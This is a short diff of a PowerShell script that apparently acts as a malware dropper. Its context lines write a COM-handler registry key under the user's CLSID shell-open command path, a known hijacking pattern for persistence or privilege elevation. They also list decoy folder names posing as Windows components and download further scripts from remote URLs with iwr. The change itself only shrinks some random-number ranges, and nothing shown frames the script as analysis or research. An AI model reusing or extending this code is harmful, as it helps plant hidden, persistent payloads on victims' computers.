@@ -11,8 +11,8 @@ $basePath = "HKCU:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\
 New-Item -Path $basePath -Force
 New-ItemProperty -Path $basePath -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs") 
-$p = Get-Random -Count 5 -In (1..2369)
-$score = Get-Random -Minimum 384 -Maximum 2023
+$p = Get-Random -Count 5 -In (1..100)
+$score = Get-Random -Minimum 1 -Maximum 100
 $rootPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $rootPath = "$rootPath\root.ps1"
 iwr -Uri $initServiceRootmonmonUri -OutFile $initServiceRootmonmonPath
@@ -21,7 +21,7 @@ iwr -Uri $initServiceFwdmonUri -OutFile $initServiceFwdmonPath
 
 
 
-1..2369 | ForEach-Object {
+1..100 | ForEach-Object {
     $curr = $_
     if($p.Contains($curr)){
         $idx = 0..($p.Count - 1) | Where-Object { $p[$_] -eq $curr }
